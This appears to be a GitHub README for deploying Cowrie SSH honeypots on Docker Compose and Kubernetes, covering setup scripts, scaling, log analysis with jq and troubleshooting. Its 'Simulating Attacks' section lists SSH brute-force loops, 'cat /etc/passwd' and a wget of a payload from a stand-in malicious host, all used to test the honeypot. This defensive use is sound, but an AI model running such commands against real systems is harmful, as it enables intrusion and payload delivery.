# 🍯 Distributed Honeypot System

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/Docker-Enabled-2496ED.svg)](https://www.docker.com/)
[![Kubernetes](https://img.shields.io/badge/Kubernetes-Supported-326CE5.svg)](https://kubernetes.io/)
[![Ubuntu](https://img.shields.io/badge/Ubuntu-22.04-E95420.svg)](https://ubuntu.com/)

> A **production-ready, scalable SSH honeypot** deployed on Kubernetes using Cowrie. Monitor SSH brute-force attacks, log attacker behavior, and analyze threat patterns in real-time.

**Table of Contents**
- [🎯 Overview](#-overview)
- [✨ Features](#-features)
- [🏗️ Architecture](#️-architecture)
- [📋 Prerequisites](#-prerequisites)
- [⚡ Quick Start](#-quick-start)
- [🚀 Full Setup](#-full-setup)
- [📖 Usage Guide](#-usage-guide)
- [⚙️ Configuration](#️-configuration)
- [🔍 Monitoring & Logs](#-monitoring--logs)
- [📊 Scaling](#-scaling)
- [🐛 Troubleshooting](#-troubleshooting)
- [📁 Project Structure](#-project-structure)
- [🤝 Contributing](#-contributing)
- [📄 License](#-license)

---

## 🎯 Overview

This project implements a **distributed SSH honeypot** on Kubernetes using [Cowrie](https://github.com/cowrie/cowrie). It's designed to:

- 🔒 **Trap attackers** attempting SSH brute-force attacks
- 📝 **Log detailed attack data** (credentials, commands, file transfers)
- 🔄 **Auto-scale** honeypot instances based on demand
- 💪 **Self-heal** failed pods automatically
- 📊 **Generate insights** about attack patterns and threat intelligence
- 🌍 **Distribute** across multiple nodes for resilience

**Perfect for**:
- Cybersecurity researchers and threat analysts
- Network security teams
- Incident response and forensics
- Threat intelligence gathering
- Educational labs and demonstrations

---

## ✨ Features

### Core Capabilities
- ✅ **Medium-Interaction Emulated Shell** - Fake filesystem mimics real Linux systems
- ✅ **Session Recording** - All attacker interactions logged for replay and analysis
- ✅ **File Capture** - Downloads and uploads captured and stored
- ✅ **Multi-user Support** - Customizable user database with credentials
- ✅ **JSON Logging** - Machine-readable logs for log aggregation systems

### Infrastructure Features
- ✅ **Container-based** - Runs in Docker/Kubernetes for easy deployment
- ✅ **Horizontally Scalable** - Deploy 3, 10, or 100 honeypot instances
- ✅ **Self-Healing** - Automatic pod restart on failure
- ✅ **Health Checks** - Liveness and readiness probes ensure availability
- ✅ **Resource Management** - CPU/memory limits prevent resource exhaustion
- ✅ **Pod Anti-Affinity** - Spreads pods across multiple nodes

### Deployment Options
- ✅ **Docker Compose** - Quick local deployment (5 minutes)
- ✅ **Kubernetes (kubeadm)** - Production deployment on full cluster (20 minutes)
- ✅ **Minikube** - Lightweight testing on single machine

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    External Networks                         │
│         (Attackers attempting SSH connections)              │
└──────────────────────┬──────────────────────────────────────┘
                       │
           ┌───────────┴───────────┐
           │   Load Balancer       │
           │   (NodePort 30222)    │
           └───────────┬───────────┘
                       │
        ┌──────────────┼──────────────┐
        │              │              │
    ┌───▼────┐    ┌───▼────┐    ┌───▼────┐
    │ Node 1 │    │ Node 2 │    │ Node 3 │
    │        │    │        │    │        │
    │ Pod 1  │    │ Pod 2  │    │ Pod 3  │
    │Cowrie  │    │Cowrie  │    │Cowrie  │
    │:2222   │    │:2222   │    │:2222   │
    └────┬───┘    └────┬───┘    └────┬───┘
         │             │             │
    ┌────▼─────────────▼─────────────▼────┐
    │    Persistent Volume (PVC)          │
    │    ├─ Logs (JSON + plaintext)       │
    │    ├─ Session recordings            │
    │    └─ Downloaded files              │
    └─────────────────────────────────────┘

    ConfigMap: Centralized Configuration
    ├─ SSH Port: 2222
    ├─ Hostname: ubuntu-server
    ├─ Logging: INFO level
    └─ API: Enabled on 5000
```

---

## 📋 Prerequisites

### System Requirements
- **OS**: Ubuntu 20.04, 22.04, or 24.04 (other Linux distros may work)
- **RAM**: Minimum 2GB per honeypot pod, 4GB+ recommended for cluster
- **Disk**: 20GB+ free space
- **Network**: Internet connectivity for package downloads

### Software Requirements
For Docker Compose deployment:
```bash
- Docker >= 20.10
- Docker Compose >= 2.0
- SSH client
```

For Kubernetes deployment:
```bash
- Docker >= 20.10
- kubectl >= 1.25
- Minikube >= 1.28 (for local testing)
```

### Pre-Installation Checks
```bash
# Check OS
uname -a

# Verify sudo access
sudo whoami

# Check internet
ping 8.8.8.8

# Check system resources
free -h      # Memory
df -h        # Disk space
```

---

## ⚡ Quick Start

### Option 1️⃣: Docker Compose (Fastest - 5 minutes)

Perfect for **testing, development, and demos**. Runs 3 honeypot instances locally.

```bash
# Clone or navigate to project
cd honeypot-project

# Build container image
./02-build-docker.sh

# Start honeypots
docker-compose up -d

# Verify they're running
docker-compose ps

# View logs
docker-compose logs -f
```

**Access your honeypots**:
```bash
ssh -p 2222 root@localhost    # Honeypot 1
ssh -p 2223 root@localhost    # Honeypot 2
ssh -p 2224 root@localhost    # Honeypot 3

# Try login (password: admin)
admin / admin
```

**Stop honeypots**:
```bash
docker-compose down
```

---

### Option 2️⃣: Kubernetes with Minikube (10 minutes)

Great for **learning Kubernetes** and **small deployments**.

```bash
# 1. Start Minikube cluster
minikube start --cpus=4 --memory=4096

# 2. Setup Kubernetes
./01-setup-kubernetes.sh

# 3. Build Docker image
./02-build-docker.sh

# 4. Deploy to Kubernetes
./03-deploy-kubernetes.sh

# 5. Test deployment
./04-test-deployment.sh

# 6. View dashboard
minikube dashboard
```

---

### Option 3️⃣: Full Kubernetes Cluster (20-30 minutes)

**Production-ready setup** on a dedicated Kubernetes cluster.

```bash
./01-setup-kubernetes.sh   # Setup cluster (15 min)
./02-build-docker.sh       # Build image (3 min)
./03-deploy-kubernetes.sh  # Deploy honeypots (2 min)
./04-test-deployment.sh    # Validate (2 min)
./05-demo-scaling.sh       # Demo scaling (3 min)
./06-validate-installation.sh  # Final checks (1 min)
```

---

## 🚀 Full Setup

### Step 1: Clone Repository

```bash
git clone https://github.com/yourusername/honeypot-project.git
cd honeypot-project
chmod +x *.sh
```

### Step 2: System Preparation

```bash
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y curl wget git gnupg lsb-release
```

### Step 3: Choose Your Deployment Path

#### Path A: Docker Compose (Simplest)
```bash
./02-build-docker.sh
docker-compose up -d
docker-compose ps
```

#### Path B: Kubernetes on Minikube (Local Testing)
```bash
./01-setup-kubernetes.sh
./02-build-docker.sh
./03-deploy-kubernetes.sh
kubectl get pods -w
```

#### Path C: Full Kubernetes Cluster (Production)
```bash
./01-setup-kubernetes.sh    # ~15 minutes
./02-build-docker.sh        # ~3 minutes
./03-deploy-kubernetes.sh
./04-test-deployment.sh
```

### Step 4: Verify Deployment

```bash
# Docker Compose
docker-compose ps

# Kubernetes
kubectl get pods
kubectl get svc
kubectl describe deployment cowrie-honeypot
```

---

## 📖 Usage Guide

### Accessing Honeypots

**Via Docker Compose**:
```bash
# Connect to honeypots
ssh -p 2222 root@localhost
ssh -p 2223 root@localhost
ssh -p 2224 root@localhost

# Default credentials
admin / admin
test / test
```

**Via Kubernetes**:
```bash
# Port-forward to access
kubectl port-forward svc/cowrie-honeypot 2222:2222

# Then connect
ssh -p 2222 root@localhost
```

### Simulating Attacks

```bash
# Try brute-force (honeypot will log all attempts)
for i in {1..10}; do
  ssh -p 2222 -o ConnectTimeout=2 baduser@localhost
done

# Try with credentials (honeypot will emulate shell)
ssh -p 2222 admin@localhost
# Inside honeypot, try commands:
ls -la
cat /etc/passwd
wget http://malicious-server.com/payload.sh
```

### Retrieving Logs

**Docker Compose**:
```bash
# View logs in real-time
docker-compose logs -f honeypot-1

# Save logs to file
docker-compose logs > honeypot-logs.txt

# View specific container
docker logs -f honeypot-1
```

**Kubernetes**:
```bash
# View pod logs
kubectl logs -f deployment/cowrie-honeypot

# Watch specific pod
kubectl logs -f pod-name

# Get all logs
kubectl logs -l app=cowrie-honeypot > all-honeypot-logs.txt
```

### Analyzing Logs

**Access log files** (Docker Compose):
```bash
# Inside container
docker exec honeypot-1 cat /cowrie/var/log/cowrie/cowrie.json | head -20

# Via volume
cat logs/logs1/cowrie.json | jq .
```

**Parse JSON logs**:
```bash
# View failed login attempts
cat logs/logs1/cowrie.json | jq 'select(.eventid=="cowrie.login.failed") | {src_ip: .src_ip, username: .username, password: .password}'

# View commands executed
cat logs/logs1/cowrie.json | jq 'select(.eventid=="cowrie.command.input") | {command: .input}'

# View file downloads
cat logs/logs1/cowrie.json | jq 'select(.eventid=="cowrie.sftp.get")'
```

---

## ⚙️ Configuration

### Environment Variables

Edit `configmap.yaml` to customize:

```yaml
COWRIE_SSH_PORT: "2222"           # SSH listening port
COWRIE_HOSTNAME: "ubuntu-server"  # Fake system hostname
COWRIE_BANNER: "Welcome"          # SSH banner
COWRIE_LOG_LEVEL: "INFO"          # Logging verbosity
```

### User Database

Edit `cowrie/etc/userdb.txt`:

```
# Format: username:password:uid:gid
admin:admin:1001:1001
test:test:1002:1002
root:12345:0:0
```

### Fake Filesystem

The honeypot includes a fake Linux filesystem. Customize in:
- `cowrie/honeyfs/` - Filesystem structure
- `cowrie/etc/issue.net` - Pre-login banner
- `cowrie/etc/motd` - Post-login message

### Resource Limits

Edit `deployment.yaml`:

```yaml
resources:
  limits:
    cpu: "500m"          # Max CPU usage
    memory: "512Mi"      # Max memory
  requests:
    cpu: "100m"          # Requested CPU
    memory: "256Mi"      # Requested memory
```

### Scaling Configuration

Edit `deployment.yaml` to change replicas:

```yaml
replicas: 3  # Change to 5, 10, 50, etc.
```

---

## 🔍 Monitoring & Logs

### Log Locations

**Docker Compose**:
```
logs/
├── logs1/
│   ├── cowrie.json          # JSON logs (structured)
│   └── cowrie.log           # Text logs
├── logs2/
│   └── ...
└── logs3/
    └── ...
```

**Kubernetes**:
```bash
kubectl exec -it <pod-name> -- ls /cowrie/var/log/cowrie/
```

### Log Format

**JSON Log Example**:
```json
{
  "eventid": "cowrie.login.failed",
  "timestamp": "2024-06-21T12:30:45.123Z",
  "src_ip": "192.168.1.100",
  "src_port": 54321,
  "dst_ip": "10.0.0.5",
  "dst_port": 2222,
  "username": "admin",
  "password": "password123",
  "session": "abc123def456"
}
```

### Real-time Monitoring

```bash
# Docker Compose - Watch logs live
docker-compose logs -f --tail=50

# Kubernetes - Watch pods
kubectl get pods -w

# Kubernetes - Watch events
kubectl get events -w
```

### Health Checks

**Docker Compose**:
```bash
docker-compose ps  # Shows container health status
```

**Kubernetes**:
```bash
# Check pod readiness
kubectl get pods -o wide

# Describe pod for health details
kubectl describe pod <pod-name>

# Check events for failures
kubectl get events --sort-by='.lastTimestamp'
```

---

## 📊 Scaling

### Scale Up (Docker Compose)

Edit `docker-compose.yml` and add more services:

```yaml
cowrie-4:
  image: cowrie-honeypot:latest
  ports:
    - "2225:2222"
  volumes:
    - ./logs/logs4:/cowrie/var/log/cowrie
  restart: unless-stopped

cowrie-5:
  image: cowrie-honeypot:latest
  ports:
    - "2226:2222"
  volumes:
    - ./logs/logs5:/cowrie/var/log/cowrie
  restart: unless-stopped
```

Then restart:
```bash
docker-compose up -d
docker-compose ps
```

### Scale Up (Kubernetes)

Change replica count:

```bash
# Via command line
kubectl scale deployment cowrie-honeypot --replicas=10

# Via editing deployment
kubectl edit deployment cowrie-honeypot
# Change: replicas: 3 to replicas: 10

# Watch scaling
kubectl get pods -w
```

### Monitor Scaling

```bash
# Watch pods being created
kubectl get pods -w

# Check resource usage
kubectl top pods

# View deployment status
kubectl rollout status deployment/cowrie-honeypot
```

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Docker Compose Containers Keep Restarting

```bash
# Check logs
docker-compose logs honeypot-1

# Verify image exists
docker images | grep cowrie

# Rebuild image
./02-build-docker.sh
docker-compose down
docker-compose up -d
```

#### 2. Cannot Connect to SSH

```bash
# Check if container is running
docker-compose ps

# Check port binding
docker port honeypot-1

# Try connecting with verbose output
ssh -vvv -p 2222 root@localhost

# Check firewall
sudo ufw allow 2222/tcp  # On Ubuntu
```

#### 3. Kubernetes Pod Stuck in CrashLoopBackOff

```bash
# Check pod status
kubectl describe pod <pod-name>

# View logs
kubectl logs <pod-name>

# Delete pod (will be recreated)
kubectl delete pod <pod-name>

# Check events
kubectl get events --sort-by='.lastTimestamp' | tail -20
```

#### 4. Out of Memory (OOM) Errors

```bash
# Check memory usage
kubectl top pods

# Increase memory limits in deployment.yaml
# Then restart deployment
kubectl rollout restart deployment/cowrie-honeypot
```

#### 5. Cannot Build Docker Image

```bash
# Clear Docker cache
docker system prune -a

# Rebuild without cache
docker build --no-cache -t cowrie-honeypot:latest .

# Check disk space
df -h

# Rebuild with verbose output
docker build --progress=plain -t cowrie-honeypot:latest .
```

### Debug Commands

```bash
# Docker Compose
docker-compose logs          # View all logs
docker-compose ps            # Check status
docker exec honeypot-1 bash  # Shell into container
docker inspect honeypot-1    # Detailed container info

# Kubernetes
kubectl logs -f <pod>           # Follow logs
kubectl exec -it <pod> bash     # Shell into pod
kubectl describe pod <pod>      # Pod details
kubectl get events -w           # Watch events
kubectl top nodes               # Node resource usage
kubectl get pvc                 # Check volumes
```

---

## 📁 Project Structure

```
honeypot-project/
├── README.md                    # This file
├── PROJECT-SUMMARY.md           # Project overview
├── IMPLEMENTATION.md            # Technical implementation details
├── QUICK-DEPLOY.md             # Quick deployment guide
├── START-HERE.md               # Getting started guide
├── CHEATSHEET.md               # Quick command reference
├── TROUBLESHOOTING.md          # Detailed troubleshooting
├── FILE-INDEX.md               # File documentation index
│
├── Dockerfile                   # Container image definition
├── Dockerfile.fixed            # Alternative Dockerfile
├── docker-compose.yml          # Docker Compose configuration
├── docker-compose-dashboard.yml # Dashboard service composition
│
├── configmap.yaml              # Kubernetes ConfigMap
├── deployment.yaml             # Kubernetes Deployment
├── cowrie-deployment.yaml       # Alternative deployment config
├── service.yaml                # Kubernetes Service
├── cowrie-service.yaml         # Alternative service config
│
├── 01-setup-kubernetes.sh      # Setup K8s cluster
├── 02-build-docker.sh          # Build Docker image
├── 03-deploy-kubernetes.sh     # Deploy to K8s
├── 04-test-deployment.sh       # Test deployment
├── 05-demo-scaling.sh          # Demo scaling
├── 06-validate-installation.sh # Validate setup
│
├── cowrie/                      # Cowrie SSH honeypot (submodule/clone)
│   ├── src/
│   ├── etc/
│   │   ├── cowrie.cfg           # Configuration
│   │   ├── cowrie.cfg.dist      # Default config
│   │   └── userdb.example       # User database template
│   ├── honeyfs/                 # Fake filesystem
│   ├── var/
│   │   ├── log/                 # Logs
│   │   └── lib/                 # Session files
│   └── requirements.txt         # Python dependencies
│
├── logs/                        # Honeypot logs (created at runtime)
│   ├── logs1/
│   ├── logs2/
│   └── logs3/
│
└── dashboard/                   # Monitoring dashboard (optional)
```

---

## 🤝 Contributing

Contributions are welcome! Please:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Areas for Contribution
- 🐛 Bug fixes
- ✨ New features
- 📚 Documentation improvements
- 🔧 Configuration examples
- 🧪 Test cases
- 🚀 Performance improvements

---

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

The Cowrie SSH honeypot is licensed under the **GPL v2 License**. See [cowrie/LICENSE.rst](cowrie/LICENSE.rst) for details.

---

## 🙋 Support

### Getting Help

1. **📖 Check Documentation**
   - [START-HERE.md](START-HERE.md) - Getting started
   - [CHEATSHEET.md](CHEATSHEET.md) - Common commands
   - [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Known issues

2. **🔗 External Resources**
   - [Cowrie Documentation](https://docs.cowrie.org/)
   - [Kubernetes Documentation](https://kubernetes.io/docs/)
   - [Docker Documentation](https://docs.docker.com/)

3. **💬 Get Support**
   - Open a [GitHub Issue](../../issues) for bugs and questions
   - Join the [Cowrie Slack](https://www.cowrie.org/slack/) community

---

## 🎓 Educational Value

This project is perfect for learning:

- 🐳 **Docker** - Containerization and container orchestration
- ☸️ **Kubernetes** - Pod management, services, deployments, scaling
- 🔒 **Cybersecurity** - Honeypots, attack logging, threat analysis
- 🔧 **DevOps** - Infrastructure as Code, automation, monitoring
- 💾 **Networking** - SSH, ports, network services, packet capture
- 📊 **Data Analysis** - Log parsing, JSON processing, analytics

---

## 📊 Statistics

- **Lines of Code**: 500+ (scripts)
- **Configuration Files**: 8
- **Documentation**: 40+ KB
- **Setup Time**: 5-30 minutes (depending on method)
- **Scalability**: From 1 to 100+ honeypot instances

---

## 🗺️ Roadmap

- [ ] Web dashboard for real-time visualization
- [ ] Elasticsearch integration for log aggregation
- [ ] Grafana dashboards for metrics
- [ ] Automated threat intelligence feeds
- [ ] Multi-cloud deployment support
- [ ] Terraform infrastructure as code
- [ ] Helm chart for easier deployment
- [ ] Advanced analytics and ML-based attack detection

---

## 👥 Authors

- **Project Creator**: Rachit Rachit
- **Based on**: [Cowrie SSH Honeypot](https://github.com/cowrie/cowrie)
- **Kubernetes Configuration**: This project

---

## ⭐ Acknowledgments

- [Cowrie](https://github.com/cowrie/cowrie) - Excellent SSH honeypot
- [Kubernetes](https://kubernetes.io/) - Container orchestration platform
- [Docker](https://www.docker.com/) - Containerization platform
- Open source community

---

**Made with ❤️ for cybersecurity professionals and researchers**

*If you find this project useful, please consider giving it a ⭐ star!*

### 1. Setup Kubernetes Cluster

```bash
chmod +x 01-setup-kubernetes.sh
./01-setup-kubernetes.sh
```

### 2. Build Docker Image

```bash
chmod +x 02-build-docker.sh
./02-build-docker.sh
```

### 3. Deploy to Kubernetes

```bash
chmod +x 03-deploy-kubernetes.sh
./03-deploy-kubernetes.sh
```

### 4. Test Deployment

```bash
chmod +x 04-test-deployment.sh
./04-test-deployment.sh
```

### 5. Run Scaling Demo

```bash
chmod +x 05-demo-scaling.sh
./05-demo-scaling.sh
```

---

## Complete Command Reference

### PART 1: KUBERNETES SETUP

#### Prerequisites
```bash
# Update system
sudo apt-get update
sudo apt-get upgrade -y

# Install curl and other essentials
sudo apt-get install -y curl wget gnupg lsb-release
```

#### Install Docker
```bash
# Add Docker GPG key
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# Add Docker repository
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io

# Start Docker
sudo systemctl enable docker
sudo systemctl start docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker
```

#### Install Kubernetes Tools
```bash
# Add Kubernetes GPG key
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.28/deb/Release.key | \
  sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg

# Add Kubernetes repository
echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.28/deb/ /' | \
  sudo tee /etc/apt/sources.list.d/kubernetes.list

# Install tools
sudo apt-get update
sudo apt-get install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
```

#### Disable Swap
```bash
sudo swapoff -a
sudo sed -i '/ swap / s/^\(.*\)$/#\1/g' /etc/fstab
```

#### Load Kernel Modules
```bash
# Load overlay and br_netfilter
cat <<EOF | sudo tee /etc/modules-load.d/containerd.conf
overlay
br_netfilter
EOF

sudo modprobe overlay
sudo modprobe br_netfilter

# Set sysctl parameters
cat <<EOF | sudo tee /etc/sysctl.d/99-kubernetes.conf
net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward = 1
net.bridge.bridge-nf-call-ip6tables = 1
EOF

sudo sysctl --system
```

#### Initialize Kubernetes Cluster
```bash
# Get local IP
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Initialize cluster
sudo kubeadm init \
  --apiserver-advertise-address=$LOCAL_IP \
  --apiserver-bind-port=6443 \
  --pod-network-cidr=10.244.0.0/16 \
  --service-cidr=10.96.0.0/12 \
  --ignore-preflight-errors=NumCPU,MemSize
```

#### Setup kubeconfig
```bash
mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
```

#### Install Network Plugin (Flannel)
```bash
kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml

# Wait for nodes to be ready
kubectl wait --for=condition=Ready node --all --timeout=300s
```

#### Untaint Master Node
```bash
kubectl taint nodes --all node-role.kubernetes.io/control-plane- \
  node-role.kubernetes.io/master- 2>/dev/null || true
```

#### Verify Cluster
```bash
# Check cluster
kubectl cluster-info

# Check nodes
kubectl get nodes -o wide

# Check system pods
kubectl get pods -n kube-system
```

---

### PART 2: DOCKER IMAGE BUILD

#### Build Image
```bash
docker build -t cowrie-honeypot:latest -f Dockerfile .
```

#### Tag Image
```bash
# For local registry
docker tag cowrie-honeypot:latest localhost:5000/cowrie-honeypot:latest

# For Docker Hub
docker tag cowrie-honeypot:latest yourusername/cowrie-honeypot:latest

# For Google Container Registry (GCR)
docker tag cowrie-honeypot:latest gcr.io/your-project/cowrie-honeypot:latest
```

#### Push Image (Optional)
```bash
# Local registry
docker push localhost:5000/cowrie-honeypot:latest

# Docker Hub (login first)
docker login
docker push yourusername/cowrie-honeypot:latest

# GCR
gcloud auth configure-docker
docker push gcr.io/your-project/cowrie-honeypot:latest
```

#### Verify Image
```bash
docker images | grep cowrie
docker inspect cowrie-honeypot:latest
```

---

### PART 3: KUBERNETES DEPLOYMENT

#### Apply ConfigMap
```bash
kubectl apply -f configmap.yaml -n default
```

#### Apply Deployment
```bash
kubectl apply -f deployment.yaml -n default
```

#### Apply Service
```bash
kubectl apply -f service.yaml -n default
```

#### Deploy All at Once
```bash
kubectl apply -f configmap.yaml -f deployment.yaml -f service.yaml -n default
```

#### Verify Deployment
```bash
# Check deployment
kubectl get deployment cowrie-honeypot -o wide

# Check pods
kubectl get pods -l app=cowrie -o wide

# Check services
kubectl get svc cowrie-service -o wide

# Check all resources
kubectl get all -l app=cowrie
```

#### Wait for Pods to be Ready
```bash
kubectl wait --for=condition=ready pod -l app=cowrie --timeout=300s
```

---

### PART 4: TESTING & VALIDATION

#### Check Pod Logs
```bash
# All pods
kubectl logs -l app=cowrie --tail=50

# Specific pod
kubectl logs <pod-name> --tail=100

# Follow logs (streaming)
kubectl logs -f <pod-name>

# All containers
kubectl logs -l app=cowrie --all-containers=true
```

#### Check Pod Status
```bash
# Get all pods
kubectl get pods -l app=cowrie

# Detailed pod info
kubectl describe pod <pod-name>

# Watch pods
kubectl get pods -l app=cowrie -w
```

#### Check Events
```bash
# Recent events
kubectl get events --sort-by='.lastTimestamp'

# Watch events
kubectl get events -w
```

#### SSH to Honeypot
```bash
# Get node IP and port
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
NODE_PORT=30222

# Connect to honeypot
ssh -p $NODE_PORT root@$NODE_IP

# Try common credentials
# Default honeypot accepts any password
```

#### Simulate SSH Attack
```bash
# One-liner SSH connection
timeout 5 ssh -o StrictHostKeyChecking=no -p 30222 root@<node-ip> "id; pwd"

# With verbose logging
ssh -vv -p 30222 root@<node-ip>

# Multiple connections
for i in {1..5}; do
  ssh -o ConnectTimeout=2 -p 30222 root@<node-ip> "whoami" &
done
wait
```

#### Check Resource Usage
```bash
# Pod resources
kubectl top pods -l app=cowrie

# Node resources
kubectl top nodes

# Detailed metrics
kubectl describe node <node-name>
```

---

### PART 5: SCALING DEMONSTRATION

#### Scale Up Replicas
```bash
# Scale to 5 replicas
kubectl scale deployment cowrie-honeypot --replicas=5

# Watch scaling
kubectl get pods -l app=cowrie -w
```

#### Scale Down Replicas
```bash
# Scale to 2 replicas
kubectl scale deployment cowrie-honeypot --replicas=2

# Verify
kubectl get pods -l app=cowrie
```

#### Update Replicas in YAML
```bash
# Edit deployment
kubectl edit deployment cowrie-honeypot

# Change: spec.replicas: 3 to desired number
# Save and exit (vi: :wq)
```

---

### PART 6: SELF-HEALING DEMONSTRATION

#### Delete Pod (Force Recreation)
```bash
# Get pod name
POD_NAME=$(kubectl get pods -l app=cowrie -o jsonpath='{.items[0].metadata.name}')

# Delete pod
kubectl delete pod $POD_NAME

# Watch new pod creation
kubectl get pods -l app=cowrie -w
```

#### Delete All Pods
```bash
# Force delete all honeypot pods
kubectl delete pods -l app=cowrie --force --grace-period=0

# Verify recreation
kubectl get pods -l app=cowrie
```

#### Simulate Pod Failure
```bash
# Kill process in container
kubectl exec <pod-name> -- kill 1

# Pod will restart automatically
kubectl get pods -l app=cowrie -w
```

---

### PART 7: LOG COLLECTION

#### View Logs from All Pods
```bash
# Last 50 lines from all pods
kubectl logs -l app=cowrie --tail=50

# Last 10 minutes
kubectl logs -l app=cowrie --since=10m

# Follow all logs
kubectl logs -f -l app=cowrie
```

#### Export Logs
```bash
# Export to file
kubectl logs -l app=cowrie > honeypot-logs.txt

# With timestamps
kubectl logs -l app=cowrie --timestamps=true > logs-with-time.txt
```

#### Check Container Logs in Pod
```bash
# List containers in pod
kubectl get pod <pod-name> -o jsonpath='{.spec.containers[*].name}'

# Get specific container logs
kubectl logs <pod-name> -c cowrie
```

---

### PART 8: CLEANUP & TEARDOWN

#### Remove Deployment
```bash
kubectl delete deployment cowrie-honeypot
```

#### Remove Service
```bash
kubectl delete svc cowrie-service
```

#### Remove ConfigMap
```bash
kubectl delete configmap cowrie-config
```

#### Remove All Honeypot Resources
```bash
kubectl delete -f deployment.yaml -f service.yaml -f configmap.yaml
```

#### Delete Entire Namespace
```bash
kubectl delete namespace honeypot
```

#### Reset Kubernetes Cluster
```bash
# Remove all resources
kubectl delete all --all

# Reset cluster (WARNING: removes cluster)
sudo kubeadm reset
```

#### Stop Docker
```bash
sudo systemctl stop docker
sudo systemctl disable docker
```

---

## File Structure

```
honeypot-project/
├── Dockerfile                 # Cowrie SSH honeypot container
├── configmap.yaml            # Kubernetes configuration
├── deployment.yaml           # Honeypot deployment (3 replicas)
├── service.yaml              # NodePort service (SSH on 30222)
├── 01-setup-kubernetes.sh    # Cluster initialization
├── 02-build-docker.sh        # Image build & push
├── 03-deploy-kubernetes.sh   # Deploy honeypot
├── 04-test-deployment.sh     # Validation tests
├── 05-demo-scaling.sh        # Scaling & self-healing demo
└── README.md                 # This file
```

---

## Key Features

### 1. Cowrie SSH Honeypot
- Logs SSH attempts
- Emulates Linux environment
- Captures credentials
- Records terminal sessions

### 2. Docker Containerization
- Lightweight Ubuntu 22.04 base
- Minimal dependencies
- Security best practices
- Health checks

### 3. Kubernetes Orchestration
- 3 replicas by default (scalable)
- Rolling updates
- Self-healing (automatic restart)
- Resource limits (256Mi mem, 100m CPU)
- NodePort service (external access)

### 4. Configuration Management
- ConfigMap for environment variables
- Easy customization
- No image rebuild required

### 5. Monitoring & Logging
- Readiness probes (TCP on port 2222)
- Liveness probes (automatic restart)
- Pod logs aggregation
- Event tracking

### 6. Security
- Non-root container user
- Resource limits
- Network policies
- Read-only filesystem (optional)

---

## Troubleshooting

### Pods Not Starting
```bash
# Check pod status
kubectl describe pod <pod-name>

# Check logs
kubectl logs <pod-name>

# Check events
kubectl get events --sort-by='.lastTimestamp'
```

### Image Not Found
```bash
# Update image in deployment.yaml
kubectl set image deployment/cowrie-honeypot \
  cowrie=<your-registry>/cowrie-honeypot:latest

# Verify
kubectl rollout status deployment/cowrie-honeypot
```

### Cannot Connect to Honeypot
```bash
# Check service
kubectl get svc cowrie-service

# Check node port
kubectl get svc cowrie-service -o jsonpath='{.spec.ports[0].nodePort}'

# Test connectivity
nc -zv <node-ip> 30222
```

### Metrics Server Not Available
```bash
# Install metrics server (for kubectl top)
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
```

---

## Performance Tuning

### Increase Replicas
```bash
kubectl scale deployment cowrie-honeypot --replicas=10
```

### Update Resource Limits
```bash
# Edit deployment
kubectl edit deployment cowrie-honeypot

# Increase: resources.limits.memory and cpu
```

### Enable HPA (Auto-scaling)
```bash
kubectl autoscale deployment cowrie-honeypot --min=3 --max=10 --cpu-percent=80
```

---

## Security Considerations

1. **Network Policies**: Add ingress/egress rules
2. **RBAC**: Limit service account permissions
3. **Pod Security**: Use security contexts
4. **Image Scanning**: Scan for vulnerabilities
5. **Monitoring**: Enable audit logging
6. **Data Protection**: Encrypt logs at rest

---

## Next Steps

1. Add Prometheus monitoring
2. Setup ELK stack for log analysis
3. Implement automated attack analysis
4. Setup alert notifications
5. Create Helm chart for easier deployment
6. Add multi-cluster support
7. Implement GitOps workflow

---

## Support & References

- **Cowrie**: https://github.com/cowrie/cowrie
- **Kubernetes**: https://kubernetes.io/docs
- **kubeadm**: https://kubernetes.io/docs/setup/production-environment/tools/kubeadm
- **Docker**: https://docs.docker.com

---

**Created**: 2026-04-30  
**Version**: 1.0  
**Author**: DevOps Engineer
